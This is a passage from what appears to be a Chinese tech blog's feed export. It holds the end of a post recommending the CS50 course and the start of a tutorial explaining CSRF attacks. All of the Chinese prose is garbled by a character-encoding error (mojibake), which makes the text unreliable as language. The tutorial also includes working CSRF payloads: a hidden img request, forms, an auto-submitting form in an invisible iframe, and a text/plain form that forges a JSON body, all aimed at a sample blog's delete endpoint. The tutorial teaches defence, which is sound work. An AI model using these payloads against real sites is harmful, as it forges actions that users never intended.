ç¬¬äº”é€±æ·±å…¥è¬›è§£è¨˜æ†¶é«”èˆ‡æŒ‡æ¨™è³‡æ–™çµæ§‹ï¼šlinked list, queue, stack, tree, BST, tries, hashmapæ•™ä½ ç”¨ wget æŠ“æª”æ¡ˆï¼Œä»¥åŠå¦‚ä½•å¯« Makefileä½œæ¥­ï¼šå¯¦ä½œå­—å…¸æ¨¹æˆ–æ˜¯ hashmap
ç¬¬å…­é€±é€™é€±é–‹å§‹è¬›è·Ÿç¶²è·¯æœ‰é—œçš„ï¼ŒåŒ…æ‹¬ï¼šIP, IPv6, domain, nslookup, traceroute, å°åŒ…, ports, dns, vpn, http, request, responseæ•™ä½ ç”¨chmodæ”¹æª”æ¡ˆæ¬Šé™ï¼Œä»¥åŠcurlæŠ“ç¶²é ä½œæ¥­ï¼šç”¨ C å¯«ä¸€å€‹ http serverï¼ˆçš„éƒ¨ä»½åŠŸèƒ½ï¼‰
ç¬¬ä¸ƒé€±chrome dev tool çš„ä½¿ç”¨ï¼Œåƒæ˜¯çœ‹ html, requeståŸºæœ¬ html èˆ‡ css æ•™å­¸php ç°¡ä»‹get&#x2F;post åƒæ•¸ä»‹ç´¹sqlåŸºæœ¬æ•™å­¸æ•™ä½ ç”¨apt-getå®‰è£å¥—ä»¶ä½œæ¥­ï¼šå®Œæˆç°¡å–®çš„ php ç¶²é ä»¥åŠèˆ‡è³‡æ–™åº«æºé€š
ç¬¬å…«é€±ç¤ºç¯„é‡æ§‹ç¨‹å¼ç¢¼ï¼Œè¬›è§£MVCçš„è§€å¿µæ•™åŸºæœ¬ SQL èªæ³•æœ‰ä»‹ç´¹åˆ°SQL Injectionä½œæ¥­ï¼šä¸²Google Map APIï¼Œä½¿ç”¨jQueryè·Ÿajaxåšå‡ºäº’å‹•æ€§è¼ƒé«˜çš„ç¶²é 
ç¬¬ä¹é€±javascript èªæ³•ç°¡ä»‹json æ ¼å¼è¬›è§£DOM æ¨¡å‹event handlerï¼Œäº‹ä»¶æ©Ÿåˆ¶  
CS50 å€¼å¾—æ¨è–¦çš„å¦å¤–ä¸€å€‹é»å°±æ˜¯èª²ç¨‹æœƒä¸æ–·æ”¹é€²ï¼Œåƒæ˜¯æˆ‘é‚£å¹´ä¹‹å¾Œå°±æŠŠç”¨ C å¯¦ä½œä¸€å€‹ http server æ‹¿æ‰äº†ï¼Œæˆ‘çŒœæ¸¬åŸå› å¯èƒ½æ˜¯é€™é …ä½œæ¥­å¤ªé›£ã€‚é‚„æœ‰åƒæ˜¯ä»¥å‰æ˜¯å­¸ PHPï¼Œç¾åœ¨èª²ç¨‹æ•™çš„æ˜¯ Pythonã€‚
æ¯ä¸€å¹´ CS50 éƒ½åœ¨é€²æ­¥ï¼ŒæŠŠä¸é©ç•¶çš„ä½œæ¥­è·Ÿå…§å®¹æ‹¿æ‰æ›æˆæ–°çš„ï¼Œå„˜ç®¡æˆ‘å·²ç¶“ä¿®éä¸€æ¬¡ï¼Œä¿®ç¬¬äºŒæ¬¡çš„æ™‚å€™ä¾ç„¶å¯ä»¥å­¸åˆ°ä¸€äº›æ–°æ±è¥¿ã€‚
ç‚ºä»€éº¼æ¨è–¦é€™é–€èª²ï¼Ÿç¾åœ¨ç¶²è·¯ä¸Šå…¶å¯¦å·²ç¶“æœ‰å¾ˆå¤šæ•™å­¸è³‡æºäº†ï¼ŒåŒ…æ‹¬å„å¼å„æ¨£çš„æ–‡ç« ä»¥åŠç·šä¸Šèª²ç¨‹ï¼Œå¯æ˜¯é€™äº›èª²ç¨‹æœ‰æ™‚å€™æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯å¤ªé›¶æ•£ã€‚é€™é‚Šä¸€é»ã€é‚£é‚Šä¸€é»ï¼Œä½ ä¿®å®Œé€™å€‹ä¹‹å¾Œé‚„è¦å»ä¿®åˆ¥çš„æ‰èƒ½è£œé½Šå…¶ä»–çŸ¥è­˜ã€‚
é‚„æœ‰ï¼ŒåŠè·¯è½‰è·çš„äººè·Ÿè³‡å·¥ç³»æœ¬ç§‘å‡ºä¾†çš„å·¥ç¨‹å¸«æœ‰ä¸€å€‹æœ€å¤§çš„å·®ç•°ï¼šComputer Science çš„ç›¸é—œçŸ¥è­˜ã€‚è¨±å¤šè·æ¥­åŸ¹è¨“ç­æ•™çš„éƒ½åªæœ‰å·¥å…·ï¼Œä¾‹å¦‚èªª Ruby on Rails, PHP ç­‰ç­‰ï¼Œæœ‰å¾ˆå¤šå­¸ç”Ÿçµè¨“ä¹‹å¾Œå¯ä»¥å¯«å‡ºä¸€å€‹ç¶²ç«™ï¼Œä½†å»å®Œå…¨ä¸çŸ¥é“é€™æ¨£ç‚ºä»€éº¼å¯ä»¥ã€‚
æ‰€ä»¥å¸¸å¸¸æœƒçœ‹åˆ°å¾ˆå¤šæ¡ˆä¾‹æ˜¯åŸ¹è¨“ç­å‡ºä¾†çš„å­¸ç”Ÿéƒ½è¢«å…¬å¸æ‰“æ§ï¼Œå› ç‚ºéš¨ä¾¿å•å€‹å¾ˆç°¡å–®çš„å•é¡Œä¹Ÿå›ç­”ä¸å‡ºä¾†ï¼ˆä½†å¦‚æœç›´æ¥å«ä»–å€‘åšç¶²ç«™ï¼Œæ˜¯åšå¾—å‡ºä¾†çš„ï¼‰ã€‚
è€Œ CS50 é€™é–€èª²ä¸€æ¬¡å¹«ä½ è£œè¶³äº†çŸ¥è­˜çš„å»£åº¦èˆ‡æ·±åº¦ã€‚
å¦‚æœä½ æœ‰èªçœŸä¿®å®Œï¼Œä½ æœƒçŸ¥é“ï¼š

è¨˜æ†¶é«”ç›¸é—œçŸ¥è­˜ï¼Œåƒæ˜¯ stack è·Ÿ heap çš„å·®åˆ¥è·Ÿä»€éº¼æ˜¯ stackoverflow
ç¶“å…¸æ’åºæ¼”ç®—æ³•ï¼Œåƒæ˜¯ bubble sort, merge sort ç­‰ç­‰
åŸºç¤è³‡æ–™çµæ§‹ï¼Œstack, queue, hash tableâ€¦
ç¶²è·¯ç›¸é—œçŸ¥è­˜ï¼Œåƒæ˜¯ TCP&#x2F;IP, HTTP ç­‰ç­‰

é™¤æ­¤ä¹‹å¤–å‘¢ï¼Œä½ ä¹Ÿæœƒå­¸åˆ°æ€éº¼ç”¨ python + flask å¯«å‡ºä¸€å€‹ç°¡å–®çš„ç¶²ç«™ï¼Œè—‰æ­¤å­¸ç¿’åˆ°ç¶²ç«™é–‹ç™¼ç›¸é—œçŸ¥è­˜ï¼Œä¾‹å¦‚èªªï¼š

cookie èˆ‡ session
web server
database çš„ä½¿ç”¨
è³‡è¨Šå®‰å…¨ç›¸é—œçŸ¥è­˜ï¼Œåƒæ˜¯ sql injection

ç¸½è€Œè¨€ä¹‹ï¼Œä¸ç®¡ä½ ä¹‹å¾Œæƒ³èµ°çš„æ˜¯å“ªå€‹é ˜åŸŸçš„å·¥ç¨‹å¸«ï¼Œé€™å ‚èª²å°ä½ ä¸€å®šå¾ˆæœ‰å¹«åŠ©ã€‚
èª°é©åˆé€™é–€èª²ï¼Ÿæˆ‘æœ€æ¨è–¦çš„æ—ç¾¤æ˜¯ã€Œæ­£åœ¨ä¸Šæˆ–æ˜¯å·²ç¶“çµæ¥­çš„åŸ¹è¨“ç­å­¸ç”Ÿã€ã€‚
ç‚ºä»€éº¼ï¼Ÿ
å› ç‚ºé€™é–€èª²çš„é–€æª»çœŸçš„ä¸ä½ã€‚ä½ çœ‹ä»–è¦æ•™é€™éº¼å¤šæ±è¥¿ï¼Œç„¶å¾Œæˆ‘åˆèªªä»–ä¸åªæ•™çš„å»£ï¼Œé‚„æ•™çš„æ·±ï¼Œå­¸ç”Ÿå¿…é ˆè¦æŠ•å…¥å¾ˆå¤šæ™‚é–“åœ¨ä¸Šé¢ï¼Œæ‰èƒ½å–å¾—ç›¸å°æ‡‰çš„å›å ±ã€‚
å¦‚æœæ˜¯ã€Œå®Œå…¨æ–°æ‰‹ã€ï¼Œå¹¾ä¹æ²’æœ‰ä»»ä½•å°ç¨‹å¼çš„ç›¸é—œçŸ¥è­˜ï¼Œç•¶ç„¶é‚„æ˜¯å¯ä»¥ä¿®é€™é–€èª²ï¼Œä½†æˆ‘è¦ºå¾—ä¸€å®šæœƒéå¸¸éå¸¸éå¸¸ç´¯ï¼Œè€Œä¸”æŒ«æŠ˜æ„Ÿæ‡‰è©²æ»¿é‡çš„ï¼Œå› ç‚ºé€™å ‚èª²çœŸçš„ä¸ç°¡å–®ã€‚æƒ³è¦æŒ‘æˆ°çœ‹çœ‹çš„è©±æˆ‘ä¹Ÿååˆ†é¼“å‹µï¼Œæˆ‘æ•¢ä¿è­‰ä½ èªçœŸä¿®å®Œä¹‹å¾Œä¸€å®šèƒ½å­¸åˆ°å¾ˆå¤šæ±è¥¿ã€‚
å°æ–¼é‚£äº›å·²ç¶“æœ‰åŸºç¤ç¨‹å¼çŸ¥è­˜çš„å­¸ç”Ÿä¾†èªªï¼Œé€™é–€èª²çš„é–€æª»æœƒç¨å¾®ä½ä¸€é»ï¼Œä½†å‰é¢äº”é€±éƒ½åœ¨ä¸Š Cï¼Œé‚„æ˜¯å¾ˆæœ‰æŒ‘æˆ°æ€§ã€‚ä¹‹å¾Œå¹¾é€±ä¸Š Web ç›¸é—œçš„æ‰æœƒæ¯”è¼ƒè¼•é¬†ä¸€é»ã€‚
æˆ‘å¿ƒå‹•äº†ï¼Œé‚£æ‡‰è©²æ€éº¼é–‹å§‹ï¼Ÿæœ€ç°¡å–®çš„æ–¹æ³•å°±æ˜¯å» edX ä¸Šé¢è¨»å†Šï¼Œç„¶å¾Œæ ¹æ“šä¸Šé¢çµ¦çš„æŒ‡ç¤ºé–‹å§‹ä¿®èª²ï¼Œå…¶å¯¦å°±è·Ÿä½ ä¿®å…¶ä»–çš„é–‹æ”¾å¼èª²ç¨‹ä¸€æ¨£ã€‚
ä½†å¦‚æœä½ æƒ³å…ˆé«”é©—çœ‹çœ‹ï¼Œå¯ä»¥ç›´æ¥åˆ° Youtube å»çœ‹èª²ç¨‹å½±ç‰‡ï¼Œçœ‹å®Œä¹‹å¾Œå†æ±ºå®šè¦ä¸è¦ä¿®èª²ã€‚
åœ¨é€™é‚Šè¦æé†’å¤§å®¶ï¼Œæˆ‘è¦ºå¾— CS50 èª²ç¨‹çš„ç²¾è¯åœ¨æ–¼ä½œæ¥­ï¼Œå¦‚æœä½ åªæ˜¯æƒ³çœ‹çœ‹å½±ç‰‡ï¼Œä½†ä½ å¤§æ¦‚åªèƒ½å­¸åˆ°é€™å ‚èª²çš„ä¸€åŠï¼Œå› ç‚ºå¦å¤–ä¸€åŠéƒ½åœ¨ä½œæ¥­è£¡äº†ã€‚è«‹å¤§å®¶å‹™å¿…åšä½œæ¥­ï¼Œå­¸ç¨‹å¼é€™ç¨®æ±è¥¿å…‰çœ‹æ˜¯ä¸è¡Œçš„ï¼Œä¸€å®šè¦ä¸‹å»å‹•æ‰‹åšæ‰æœƒæ›´æœ‰æ„Ÿè¦ºã€‚
ä¹‹å‰ç‚ºäº†é¼“å‹µæ›´å¤šäººä¾†ä¿® CS50ï¼Œæˆ‘æœ‰åšäº†ä¸€ç³»åˆ—çš„å°è®€ï¼Œæ¯ä¸€é€±éƒ½æœ‰ä¸€æ”¯å°è®€å½±ç‰‡ï¼Œä¸»è¦å°±æ˜¯è½æˆ‘ç¨å¾®å†è¬›ä¸€ä¸‹é€™ä¸€é€±çš„é‡é»ä»¥åŠåšä¸€é»å°è£œå……ã€‚å°è®€å½±ç‰‡çš„è©±ä¹Ÿå¯ä»¥åˆ° Youtube ä¸Šé¢çœ‹ã€‚
æ¯ä¸€æ¬¡å°è®€å®Œæˆ‘éƒ½æœ‰æŠŠå¿ƒå¾—è¨˜éŒ„ä¸‹ä¾†ï¼Œæƒ³çœ‹å¿ƒå¾—çš„è©±å¯ä»¥åˆ°é€™é‚Šã€‚
çµè«–CS50 ä»¥éå¸¸ç”Ÿæ´»åŒ–è€Œä¸”ç›¡é‡ç°¡å–®çš„æ–¹å¼è¬›æˆè‰±æ¾€çš„é›»è…¦ç§‘å­¸ç›¸é—œçŸ¥è­˜ï¼Œå°æˆ‘æœ¬èº«çš„æ•™å­¸ç†å¿µä»¥åŠé¢¨æ ¼å½±éŸ¿æ·±é ã€‚é€™é–€èª²çµ¦äº†æˆ‘å¾ˆå¤šæ•™å­¸ä¸Šçš„å•Ÿç™¼ï¼Œè®“æˆ‘çŸ¥é“åŸä¾†æ›å€‹æ–¹å¼è¬›ï¼Œå¯ä»¥æŠŠä¸€ä»¶äº‹æƒ…è§£é‡‹å¾—æ¸…æ¥šè¨±å¤šã€‚
ã€Œå¦‚æµ·æ´‹èˆ¬çš„ç¨‹å¼èª²ç¨‹ã€æ˜¯æˆ‘ä¹‹å‰çµ¦å®ƒå–çš„ç¨±è™Ÿï¼Œå› ç‚ºå®ƒã€Œåˆæ·±åˆå»£ã€ã€‚è¬›è¿°çš„çŸ¥è­˜ç¯„åœæ—¢å»£åˆåŒæ™‚å…¼é¡§äº†æ·±åº¦ï¼ŒçœŸçš„æ˜¯ä¸€é–€å¾ˆæ£’çš„èª²ç¨‹ã€‚
æœ€å¾Œï¼Œå†æ¬¡æ¨è–¦é€™é–€èª²çµ¦æ‰€æœ‰æƒ³è¦æ›´ç­è§£ Computer Science çš„äººã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>cs50</tag>
      </tags>
  </entry>
  <entry>
    <title>è®“æˆ‘å€‘ä¾†è«‡è«‡ CSRF</title>
    <url>/2017/02/25/csrf-introduction/</url>
    <content><![CDATA[Update:ç¶“éæœ‹å‹æŒ‡å‡ºæ–‡ç« ä¸­ç¼ºæ¼çš„åœ°æ–¹ï¼Œæ–¼ 2&#x2F;26 æ—©ä¸Šæ–°å¢ä¸€æ®µè¬› SameSite Cookie çš„æ®µè½ã€‚æ„Ÿè¬ shik çš„æé»ã€‚
å‰è¨€æœ€è¿‘å‰›å¥½ç¢°åˆ°ä¸€äº› CSRF çš„æ¡ˆä¾‹ï¼Œè¶è‘—é€™æ¬¡æ©Ÿæœƒå¥½å¥½ç ”ç©¶äº†ä¸€ä¸‹ã€‚æ·±å…¥ç ”ç©¶ä¹‹å¾Œæ‰ç™¼ç¾é€™å€‹æ”»æ“Šå…¶å¯¦æ»¿å¯æ€•çš„ï¼Œå› ç‚ºå¾ˆå®¹æ˜“å¿½ç•¥å®ƒã€‚ä½†å¹¸å¥½ç¾åœ¨æœ‰äº› Framework éƒ½æœ‰å…§å»ºé˜²ç¦¦ CSRF çš„åŠŸèƒ½ï¼Œå¯ä»¥å¾ˆç°¡å–®çš„é–‹å•Ÿã€‚
ä½†å„˜ç®¡å¦‚æ­¤ï¼Œæˆ‘èªç‚ºé‚„æ˜¯æœ‰å¿…è¦ç­è§£ä¸€ä¸‹ CSRF åˆ°åº•åœ¨å¹¹å˜›ï¼Œæ˜¯é€éæ€æ¨£çš„æ‰‹æ®µæ”»æ“Šï¼Œä»¥åŠè©²å¦‚ä½•é˜²ç¦¦ã€‚å°±è®“æˆ‘å€‘å…ˆä¾†ç°¡å–®çš„ä»‹ç´¹ä¸€ä¸‹å®ƒå§ï¼
CSRF æ˜¯ä¸€ç¨® Web ä¸Šçš„æ”»æ“Šæ‰‹æ³•ï¼Œå…¨ç¨±æ˜¯ Cross Site Request Forgeryï¼Œè·¨ç«™è«‹æ±‚å½é€ ã€‚ä¸è¦è·Ÿ XSS ææ··äº†ï¼Œä»–å€‘å…©ç¨®æ˜¯ä¸åŒçš„æ±è¥¿ï¼Œé‚£åˆ°åº•ä»€éº¼æ˜¯ CSRF å‘¢ï¼Ÿå…ˆå¾æˆ‘è‡ªèº«çš„ä¸€å€‹æ¡ˆä¾‹è«‡èµ·å¥½äº†ã€‚
å·æ‡¶çš„åˆªé™¤åŠŸèƒ½ä»¥å‰æˆ‘æœ‰åšå€‹ä¸€å€‹ç°¡å–®çš„å¾Œå°é é¢ï¼Œå°±æƒ³æˆæ˜¯ä¸€å€‹éƒ¨è½æ ¼å§ï¼å¯ä»¥ç™¼è¡¨ã€åˆªé™¤ä»¥åŠç·¨è¼¯æ–‡ç« ï¼Œä»‹é¢å¤§æ¦‚é•·å¾—åƒé€™æ¨£ï¼š


å¯ä»¥çœ‹åˆ°åˆªé™¤çš„é‚£å€‹æŒ‰éˆ•ï¼Œé»ä¸‹å»ä¹‹å¾Œå°±å¯ä»¥æŠŠä¸€ç¯‡æ–‡ç« åˆªæ‰ã€‚ç•¶åˆå› ç‚ºå·æ‡¶ï¼Œæƒ³èªªå¦‚æœæˆ‘æŠŠé€™å€‹åŠŸèƒ½åšæˆ GETï¼Œæˆ‘å°±å¯ä»¥ç›´æ¥ç”¨ä¸€å€‹é€£çµå®Œæˆåˆªé™¤é€™ä»¶äº‹ï¼Œåœ¨å‰ç«¯å¹¾ä¹ä¸ç”¨å¯«åˆ°ä»»ä½•ç¨‹å¼ç¢¼ï¼š
&lt;a href=&#x27;/delete?id=3&#x27;&gt;åˆªé™¤&lt;/a&gt;

å¾ˆæ–¹ä¾¿å°å§ï¼Ÿç„¶å¾Œæˆ‘åœ¨ç¶²é å¾Œç«¯é‚£é‚Šåšä¸€ä¸‹é©—è­‰ï¼Œé©—è­‰ request æœ‰æ²’æœ‰å¸¶ session id ä¸Šä¾†ï¼Œä¹Ÿé©—è­‰é€™ç¯‡æ–‡ç« æ˜¯ä¸æ˜¯é€™å€‹ id çš„ä½œè€…å¯«çš„ï¼Œéƒ½ç¬¦åˆçš„è©±æ‰åˆªé™¤æ–‡ç« ã€‚
å—¯ï¼Œè½èµ·ä¾†è©²åšçš„éƒ½åšäº†å•Šï¼Œæˆ‘éƒ½å·²ç¶“åšåˆ°ï¼šã€Œåªæœ‰ä½œè€…æœ¬äººå¯ä»¥åˆªé™¤è‡ªå·±çš„æ–‡ç« ã€äº†ï¼Œæ‡‰è©²å¾ˆå®‰å…¨äº†ï¼Œé›£é“é‚„æœ‰å“ªè£¡æ¼æ‰äº†å—ï¼Ÿ
æ²’éŒ¯ï¼Œçš„ç¢ºæ˜¯ã€Œåªæœ‰ä½œè€…æœ¬äººå¯ä»¥åˆªé™¤è‡ªå·±çš„æ–‡ç« ã€ï¼Œä½†å¦‚æœä»–ä¸æ˜¯è‡ªå·±ã€Œä¸»å‹•åˆªé™¤ã€ï¼Œè€Œæ˜¯åœ¨ä¸çŸ¥æƒ…çš„æƒ…æ³ä¸‹åˆªé™¤å‘¢ï¼Ÿä½ å¯èƒ½æœƒè¦ºå¾—æˆ‘åœ¨è¬›ä»€éº¼æ±è¥¿ï¼Œæ€éº¼æœƒæœ‰é€™ç¨®äº‹æƒ…ç™¼ç”Ÿï¼Œä¸æ˜¯ä½œè€…ä¸»å‹•åˆªçš„é‚„èƒ½æ€éº¼åˆªï¼Ÿ
å¥½ï¼Œæˆ‘å°±ä¾†è®“ä½ çœ‹çœ‹é‚„èƒ½æ€éº¼åˆªï¼
ä»Šå¤©å‡è¨­å°é»‘æ˜¯ä¸€å€‹é‚ªæƒ¡çš„å£è›‹ï¼Œæƒ³è¦è®“å°æ˜åœ¨ä¸çŸ¥æƒ…çš„æƒ…æ³ä¸‹å°±æŠŠè‡ªå·±çš„æ–‡ç« åˆªæ‰ï¼Œè©²æ€éº¼åšå‘¢ï¼Ÿ
ä»–çŸ¥é“å°æ˜å¾ˆå–œæ­¡å¿ƒç†æ¸¬é©—ï¼Œæ–¼æ˜¯å°±åšäº†ä¸€å€‹å¿ƒç†æ¸¬é©—ç¶²ç«™ï¼Œä¸¦ä¸”ç™¼çµ¦å°æ˜ã€‚ä½†é€™å€‹å¿ƒç†æ¸¬é©—ç¶²ç«™è·Ÿå…¶ä»–ç¶²ç«™ä¸åŒçš„é»åœ¨æ–¼ï¼Œã€Œé–‹å§‹æ¸¬é©—ã€çš„æŒ‰éˆ•é•·å¾—åƒé€™æ¨£ï¼š
&lt;a href=&#x27;https://small-min.blog.com/delete?id=3&#x27;&gt;é–‹å§‹æ¸¬é©—&lt;/a&gt;

å°æ˜æ”¶åˆ°ç¶²é ä¹‹å¾Œå¾ˆé–‹å¿ƒï¼Œå°±é»æ“Šã€Œé–‹å§‹æ¸¬é©—ã€ã€‚é»æ“Šä¹‹å¾Œç€è¦½å™¨å°±æœƒç™¼é€ä¸€å€‹ GET è«‹æ±‚çµ¦https://small-min.blog.com/delete?id=3ï¼Œä¸¦ä¸”å› ç‚ºç€è¦½å™¨çš„é‹è¡Œæ©Ÿåˆ¶ï¼Œä¸€ä½µæŠŠ small-min.blog.com çš„ cookie éƒ½ä¸€èµ·å¸¶ä¸Šå»ã€‚
Server ç«¯æ”¶åˆ°ä¹‹å¾Œæª¢æŸ¥äº†ä¸€ä¸‹ sessionï¼Œç™¼ç¾æ˜¯å°æ˜ï¼Œè€Œä¸”é€™ç¯‡æ–‡ç« ä¹ŸçœŸçš„æ˜¯å°æ˜ç™¼çš„ï¼Œæ–¼æ˜¯å°±æŠŠé€™ç¯‡æ–‡ç« çµ¦åˆªé™¤äº†ã€‚
é€™å°±æ˜¯ CSRFï¼Œä½ ç¾åœ¨æ˜æ˜åœ¨å¿ƒç†æ¸¬é©—ç¶²ç«™ï¼Œå‡è¨­æ˜¯ https://test.com å¥½äº†ï¼Œä½†æ˜¯å»åœ¨ä¸çŸ¥æƒ…çš„ç‹€æ³ä¸‹åˆªé™¤äº† https://small-min.blog.com çš„æ–‡ç« ï¼Œä½ èªªé€™å¯ä¸å¯æ€•ï¼Ÿè¶…å¯æ€•ï¼
é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ CSRF åˆç¨±ä½œ one-click attack çš„ç·£æ•…ï¼Œä½ åªè¦é»ä¸€ä¸‹å°±ä¸­æ‹›äº†ã€‚
ä½ å¯èƒ½æœƒèªªï¼šã€Œå¯æ˜¯é€™æ¨£å°æ˜ä¸å°±çŸ¥é“äº†å—ï¼Œä¸å°±é€£éå»éƒ¨è½æ ¼äº†ï¼Ÿä¸ç¬¦åˆã€ä¸çŸ¥æƒ…çš„ç‹€æ³ã€å•Šï¼ã€
å¥½ï¼Œé‚£å¦‚æœæˆ‘å€‘æ”¹æˆé€™æ¨£å‘¢ï¼š
&lt;img src=&#x27;https://small-min.blog.com/delete?id=3&#x27; width=&#x27;0&#x27; height=&#x27;0&#x27; /&gt;&lt;a href=&#x27;/test&#x27;&gt;é–‹å§‹æ¸¬é©—&lt;/a&gt;

åœ¨é–‹å•Ÿé é¢çš„åŒæ™‚ï¼Œä¸€æ¨£ç™¼é€ä¸€å€‹åˆªé™¤çš„ request å‡ºå»ï¼Œä½†é€™æ¬¡å°æ˜æ˜¯çœŸçš„å®Œå…¨ä¸çŸ¥é“é€™ä»¶äº‹æƒ…ã€‚é€™æ¨£å°±ç¬¦åˆäº†å§ï¼
CSRF å°±æ˜¯åœ¨ä¸åŒçš„ domain åº•ä¸‹å»èƒ½å¤ å½é€ å‡ºã€Œä½¿ç”¨è€…æœ¬äººç™¼å‡ºçš„ requestã€ã€‚è¦é”æˆé€™ä»¶äº‹ä¹Ÿå¾ˆç°¡å–®ï¼Œå› ç‚ºç€è¦½å™¨çš„æ©Ÿåˆ¶ï¼Œä½ åªè¦ç™¼é€ request çµ¦æŸå€‹ç¶²åŸŸï¼Œå°±æœƒæŠŠé—œè¯çš„ cookie ä¸€èµ·å¸¶ä¸Šå»ã€‚å¦‚æœä½¿ç”¨è€…æ˜¯ç™»å…¥ç‹€æ…‹ï¼Œé‚£é€™å€‹ request å°±ç†æ‰€ç•¶ç„¶åŒ…å«äº†ä»–çš„è³‡è¨Šï¼ˆä¾‹å¦‚èªª session idï¼‰ï¼Œé€™ request çœ‹èµ·ä¾†å°±åƒæ˜¯ä½¿ç”¨è€…æœ¬äººç™¼å‡ºçš„ã€‚
é‚£æˆ‘æŠŠåˆªé™¤æ”¹æˆ POST ä¸å°±å¥½äº†å—ï¼Ÿæ²’éŒ¯ï¼Œè°æ˜ï¼æˆ‘å€‘ä¸è¦é‚£éº¼æ‡¶ï¼Œå¥½å¥½æŠŠåˆªé™¤çš„åŠŸèƒ½åšæˆ POSTï¼Œé€™æ¨£ä¸å°±ç„¡æ³•é€é &lt;a&gt; æˆ–æ˜¯ &lt;img&gt; ä¾†æ”»æ“Šäº†å—ï¼Ÿé™¤éæœ‰å“ªå€‹ HTML å…ƒç´ å¯ä»¥ç™¼é€ POST requestï¼
æœ‰ï¼Œæ­£å¥½æœ‰ä¸€å€‹ï¼Œå°±å«åš formã€‚
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;é–‹å§‹æ¸¬é©—&quot;/&gt;&lt;/form&gt;

å°æ˜é»ä¸‹å»ä»¥å¾Œï¼Œç…§æ¨£ä¸­æ‹›ï¼Œä¸€æ¨£åˆªé™¤äº†æ–‡ç« ã€‚ä½ å¯èƒ½åˆæœƒç–‘æƒ‘èªªï¼Œä½†æ˜¯é€™æ¨£å°æ˜ä¸å°±çŸ¥é“äº†å—ï¼Ÿæˆ‘è·Ÿä½ ä¸€æ¨£å¾ˆç–‘æƒ‘ï¼Œæ–¼æ˜¯æˆ‘ Google åˆ°äº†é€™ç¯‡ï¼šExample of silently submitting a POST FORM (CSRF)
é€™ç¯‡æä¾›çš„ç¯„ä¾‹å¦‚ä¸‹ï¼Œç¶²é çš„ä¸–ç•ŒçœŸæ˜¯åšå¤§ç²¾æ·±ï¼š
&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&#x27;POST&#x27; action=&#x27;https://small-min.blog.com/delete&#x27; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&#x27;hidden&#x27; name=&#x27;id&#x27; value=&#x27;3&#x27;&gt;  &lt;input type=&#x27;submit&#x27; value=&#x27;submit&#x27;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;

é–‹ä¸€å€‹çœ‹ä¸è¦‹çš„ iframeï¼Œè®“ form submit ä¹‹å¾Œçš„çµæœå‡ºç¾åœ¨ iframe è£¡é¢ï¼Œè€Œä¸”é€™å€‹ form é‚„å¯ä»¥è‡ªå‹• submitï¼Œå®Œå…¨ä¸éœ€è¦ç¶“éå°æ˜çš„ä»»ä½•æ“ä½œã€‚
åˆ°äº†é€™æ­¥ï¼Œä½ å°±çŸ¥é“æ”¹æˆ POST æ˜¯æ²’ç”¨çš„ã€‚
é‚£æˆ‘å¾Œç«¯æ”¹æˆåªæ¥æ”¶ json å‘¢ï¼Ÿè°æ˜çš„ä½ éˆæ©Ÿä¸€å‹•ï¼šã€Œæ—¢ç„¶åœ¨å‰ç«¯åªæœ‰ form å¯ä»¥é€å‡º POST çš„è©±ï¼Œé‚£æˆ‘çš„ api æ”¹æˆç”¨ json æ”¶è³‡æ–™ä¸å°±å¯ä»¥äº†å—ï¼Ÿé€™æ¨£ç¸½ä¸èƒ½ç”¨ form äº†å§ï¼ã€
spring çš„ documentå‘Šè¨´ä½ ï¼šé€™é‚„æ˜¯æ²’ç”¨çš„ï¼
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot;&gt;&lt;input name=&#x27;&#123;&quot;id&quot;:3, &quot;ignore_me&quot;:&quot;&#x27; value=&#x27;test&quot;&#125;&#x27; type=&#x27;hidden&#x27;&gt;&lt;input type=&quot;submit&quot;  value=&quot;delete!&quot;/&gt;&lt;/form&gt;

é€™æ¨£å­æœƒç”¢ç”Ÿå¦‚ä¸‹çš„ request bodyï¼š
&#123; &quot;id&quot;: 3,&quot;ignore_me&quot;: &quot;=test&quot;&#125;

ä½†é€™é‚Šå€¼å¾—æ³¨æ„çš„ä¸€é»æ˜¯ï¼Œformèƒ½å¤ å¸¶çš„ content type åªæœ‰ä¸‰ç¨®ï¼šapplication/x-www-form-urlencoded, multipart/form-data è·Ÿ text/plainã€‚åœ¨ä¸Šé¢çš„æ”»æ“Šä¸­æˆ‘å€‘ç”¨çš„æ˜¯æœ€å¾Œä¸€ç¨®ï¼Œtext/plainï¼Œå¦‚æœä½ åœ¨ä½ çš„å¾Œç«¯ Server æœ‰æª¢æŸ¥é€™å€‹ content type çš„è©±ï¼Œæ˜¯å¯ä»¥é¿å…æ‰ä¸Šé¢é€™å€‹æ”»æ“Šçš„ã€‚
åªæ˜¯ï¼Œä¸Šé¢é€™å¹¾å€‹æ”»æ“Šæˆ‘å€‘éƒ½é‚„æ²’è¬›åˆ°ä¸€ç¨®æƒ…æ³ï¼šå¦‚æœä½ çš„ api æ¥å— cross origin çš„ request å‘¢ï¼Ÿ
æ„æ€å°±æ˜¯ï¼Œå¦‚æœä½ çš„ api çš„ Access-Control-Allow-Origin è¨­æˆ * çš„è©±ï¼Œä»£è¡¨ä»»ä½• domain éƒ½å¯ä»¥ç™¼é€ ajax åˆ°ä½ çš„ api serverï¼Œé€™æ¨£ç„¡è«–ä½ æ˜¯æ”¹æˆ jsonï¼Œæˆ–ç”šè‡³æŠŠ method æ”¹æˆ PUT, DELETE éƒ½æ²’æœ‰ç”¨ã€‚
